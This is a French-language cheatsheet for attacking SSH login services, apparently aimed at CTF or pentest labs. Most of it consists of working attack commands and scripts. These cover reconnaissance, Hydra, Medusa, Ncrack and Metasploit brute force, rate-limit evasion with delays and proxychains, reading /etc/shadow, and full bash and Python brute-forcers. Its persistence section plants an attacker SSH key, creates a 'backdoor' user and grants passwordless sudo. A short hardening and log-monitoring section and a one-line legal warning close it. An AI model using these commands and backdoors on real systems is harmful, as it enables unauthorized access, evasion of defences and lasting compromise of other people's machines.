# SSH Login - Cheatsheet d'Exploitation

## Vue d'ensemble
Cette cheatsheet couvre les techniques d'attaque par force brute et d'exploitation des services SSH, incluant la reconnaissance, l'énumération, les attaques par dictionnaire et les techniques d'évasion.

---

## Phase 1: Reconnaissance et découverte

### Test de connectivité
```bash
# Vérification de l'accessibilité de la cible
ping -c 4 <target>
ping6 -c 4 <target>  # Pour IPv6
```

### Scan des ports SSH
```bash
# Scan basique
nmap -p 22 <target>

# Scan détaillé avec détection de version
nmap -sS -sV -p 22 <target>

# Scan complet des ports SSH alternatifs
nmap -p 22,2222,2022,222,22222 -sV <target>

# Scan agressif avec scripts
nmap -sS -sV -sC -p 22 --script ssh* <target>
```

### Énumération avec Nmap NSE
```bash
# Scripts SSH spécialisés
nmap --script ssh-hostkey <target>
nmap --script ssh-auth-methods <target>
nmap --script ssh-brute <target>
nmap --script ssh2-enum-algos <target>
nmap --script ssh-publickey-acceptance <target>
```

---

## Phase 2: Énumération des informations SSH

### Détection de version avec Metasploit
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target>
set RPORT 22
run
```

### Banner grabbing manuel
```bash
# Avec netcat
nc <target> 22

# Avec telnet
telnet <target> 22

# Avec nmap
nmap -sV -p 22 <target> --version-intensity 9
```

### Identification des méthodes d'authentification
```bash
# Test des méthodes supportées
ssh -o PreferredAuthentications=none <target>

# Test spécifique
ssh -o PreferredAuthentications=password <target>
```

---

## Phase 3: Attaques par force brute

### Avec Metasploit (Méthode principale)

#### Configuration de base
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set RPORT 22
set STOP_ON_SUCCESS true
set VERBOSE true
```

#### Utilisation de wordlists intégrées
```bash
# Utilisateurs et mots de passe communs
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
exploit

# Wordlists Unix
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

#### Test utilisateur unique
```bash
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
exploit
```

#### Test mot de passe unique
```bash
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASSWORD password123
exploit
```

### Avec Hydra

#### Syntaxe de base
```bash
# Utilisateur unique, wordlist de mots de passe
hydra -l <username> -P <password_file> ssh://<target>

# Wordlist d'utilisateurs, mot de passe unique
hydra -L <user_file> -p <password> ssh://<target>

# Wordlists multiples
hydra -L <user_file> -P <password_file> ssh://<target>

# Avec port personnalisé
hydra -L users.txt -P passwords.txt ssh://<target>:2222
```

#### Exemples pratiques avec Hydra
```bash
# Test des combinaisons classiques
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ssh://<target>

# Attaque ciblée sur root
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4 -f

# Test avec délai pour éviter le rate limiting
hydra -L users.txt -P passwords.txt ssh://<target> -t 1 -W 3
```

### Avec Medusa
```bash
# Syntaxe de base
medusa -h <target> -u <username> -P <password_file> -M ssh

# Wordlists multiples
medusa -h <target> -U <user_file> -P <password_file> -M ssh -t 10

# Avec options avancées
medusa -h <target> -U users.txt -P passwords.txt -M ssh -T 5 -t 10 -L
```

### Avec Ncrack
```bash
# Attaque basique
ncrack -p 22 --user <username> -P <password_file> <target>

# Avec timing personnalisé
ncrack -p 22 -U users.txt -P passwords.txt --timing 3 <target>
```

---

## Phase 4: Wordlists et dictionnaires

### Wordlists communes

#### Utilisateurs
```bash
# SecLists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Metasploit
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_users.txt

# Wordlists personnalisées par défaut
admin, root, user, test, guest, administrator, oracle, postgres, mysql
```

#### Mots de passe
```bash
# Rockyou (le plus populaire)
/usr/share/wordlists/rockyou.txt

# SecLists
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
/usr/share/seclists/Passwords/darkweb2017-top1000.txt
/usr/share/seclists/Passwords/probable-v2-top12000.txt

# Metasploit
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### Génération de wordlists personnalisées

#### Avec CeWL
```bash
# Génération depuis un site web
cewl -d 2 -m 5 -w passwords.txt http://<target>

# Avec variations
cewl -d 2 -m 5 --with-numbers -w passwords.txt http://<target>
```

#### Avec Crunch
```bash
# Génération par longueur
crunch 6 8 0123456789 -o numbers.txt

# Avec pattern
crunch 8 8 -t @@@@@@@@
```

---

## Phase 5: Techniques avancées d'évasion

### Contournement du rate limiting

#### Délais entre tentatives
```bash
# Hydra avec délais
hydra -L users.txt -P passwords.txt ssh://<target> -W 2 -t 1

# Medusa avec timing
medusa -h <target> -U users.txt -P passwords.txt -M ssh -T 2
```

#### Rotation d'IP sources (si disponible)
```bash
# Avec proxychains
proxychains hydra -L users.txt -P passwords.txt ssh://<target>
```

### Authentification par clés SSH

#### Énumération des clés publiques
```bash
# Test d'acceptation de clés
nmap --script ssh-publickey-acceptance --script-args="ssh.usernames={'root','admin'}" <target>

# Recherche de clés exposées
find / -name "*.pub" 2>/dev/null
find / -name "id_rsa*" 2>/dev/null
```

#### Attaque par clés SSH
```bash
# Avec Metasploit
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS <target>
set USERNAME root
set KEY_FILE /path/to/id_rsa
run
```

---

## Phase 6: Post-exploitation

### Établissement de session

#### Connexion SSH directe
```bash
# Avec mot de passe
ssh <username>@<target>

# Avec clé privée
ssh -i <private_key> <username>@<target>

# Avec port personnalisé
ssh -p <port> <username>@<target>
```

#### Via Metasploit sessions
```bash
# Lister les sessions actives
sessions

# Interagir avec une session
sessions -i <session_id>

# Upgrader vers Meterpreter
sessions -u <session_id>
```

### Reconnaissance locale
```bash
# Informations système
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow

# Recherche de flags
find / -name "*flag*" 2>/dev/null
find / -type f -name "flag" 2>/dev/null
locate flag
grep -r "flag" /home/ 2>/dev/null
```

### Persistance
```bash
# Ajouter une clé SSH
mkdir -p ~/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Créer un utilisateur backdoor
sudo useradd -m -s /bin/bash backdoor
sudo passwd backdoor

# Modifier sudoers
echo "backdoor ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
```

---

## Phase 7: Outils automatisés et scripts

### Script Bash pour force brute
```bash
#!/bin/bash
# ssh_bruteforce.sh

TARGET=$1
USERLIST=$2
PASSLIST=$3

if [ $# -ne 3 ]; then
    echo "Usage: $0 <target> <userlist> <passlist>"
    exit 1
fi

while IFS= read -r user; do
    while IFS= read -r pass; do
        echo "Trying $user:$pass"
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$TARGET" exit 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[SUCCESS] $user:$pass"
            exit 0
        fi
    done < "$PASSLIST"
done < "$USERLIST"
```

### Script Python avancé
```python
#!/usr/bin/env python3
import paramiko
import sys
import threading
import time

class SSHBruteForce:
    def __init__(self, target, port=22):
        self.target = target
        self.port = port
        self.success = False
        
    def ssh_connect(self, username, password):
        if self.success:
            return
            
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.port, username=username, 
                       password=password, timeout=5)
            
            print(f"[SUCCESS] {username}:{password}")
            self.success = True
            ssh.close()
        except:
            pass
    
    def run_attack(self, userlist, passlist):
        for username in userlist:
            if self.success:
                break
            for password in passlist:
                if self.success:
                    break
                thread = threading.Thread(target=self.ssh_connect, 
                                        args=(username, password))
                thread.start()
                time.sleep(0.1)

# Utilisation
if len(sys.argv) != 4:
    print("Usage: python3 ssh_brute.py <target> <userlist> <passlist>")
    sys.exit(1)

bruteforcer = SSHBruteForce(sys.argv[1])
# Charger les listes et lancer l'attaque
```

---

## Phase 8: Détection et contre-mesures

### Configuration sécurisée SSH

#### Durcissement du serveur SSH
```bash
# Éditer /etc/ssh/sshd_config
sudo nano /etc/ssh/sshd_config

# Configurations recommandées:
Port 2222                          # Port non standard
PermitRootLogin no                 # Interdire root
MaxAuthTries 3                     # Limiter les tentatives
PasswordAuthentication no          # Désactiver l'auth par mot de passe
PubkeyAuthentication yes           # Activer l'auth par clés
AllowUsers username                # Limiter les utilisateurs autorisés
Protocol 2                         # Utiliser SSH v2 uniquement
```

#### Mise en place de Fail2Ban
```bash
# Installation
sudo apt-get install fail2ban

# Configuration basique
sudo nano /etc/fail2ban/jail.local

[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 600
```

### Détection des attaques

#### Surveillance des logs
```bash
# Tentatives de connexion SSH
tail -f /var/log/auth.log | grep ssh

# Connexions réussies
grep "Accepted" /var/log/auth.log

# Tentatives échouées
grep "Failed password" /var/log/auth.log
```

---

## Checklist complète

### Phase de reconnaissance
- [ ] Test de connectivité (ping)
- [ ] Scan Nmap des ports SSH
- [ ] Détection de version SSH
- [ ] Énumération des méthodes d'authentification
- [ ] Banner grabbing

### Phase d'attaque
- [ ] Préparation des wordlists
- [ ] Configuration des outils (Metasploit/Hydra)
- [ ] Attaque par force brute
- [ ] Test d'authentification par clés SSH
- [ ] Vérification des credentials trouvés

### Phase de post-exploitation
- [ ] Établissement de session SSH
- [ ] Reconnaissance locale du système
- [ ] Recherche de flags/données sensibles
- [ ] Documentation des preuves
- [ ] Mise en place de persistance (si autorisé)

---

## Wordlists essentielles

### Utilisateurs par défaut à tester
```
root, admin, administrator, user, test, guest, oracle, postgres, mysql, 
www-data, apache, nginx, tomcat, jenkins, gitlab, ubuntu, debian, centos,
redhat, suse, backup, service, operator, games, nobody, ftp, ssh
```

### Mots de passe communs
```
password, 123456, admin, root, password123, admin123, 12345678, qwerty,
abc123, Password1, welcome, login, pass, secret, default, guest, test,
changeme, password1, administrator, letmein, monkey, dragon, 111111
```

---

## Outils recommandés

### Outils de force brute
- **Metasploit** - Framework complet avec modules SSH
- **Hydra** - Outil rapide et polyvalent
- **Medusa** - Alternative stable à Hydra
- **Ncrack** - De l'équipe Nmap
- **SSHBruter** - Spécialisé SSH

### Outils de reconnaissance
- **Nmap** - Scanner de ports avec scripts NSE
- **SSHScan** - Scanner spécialisé SSH
- **SSH-Audit** - Audit de configuration SSH

---

## Notes importantes

⚠️ **Avertissement légal:** Utilisez ces techniques uniquement sur des systèmes que vous possédez ou avec autorisation explicite.

🔧 **Configuration:** Adaptez les délais et threads selon la cible pour éviter la détection.

🛡️ **Défense:** Implémentez fail2ban, utilisez des clés SSH et changez le port par défaut.

📊 **Performance:** Hydra est généralement plus rapide que Metasploit pour les attaques simples.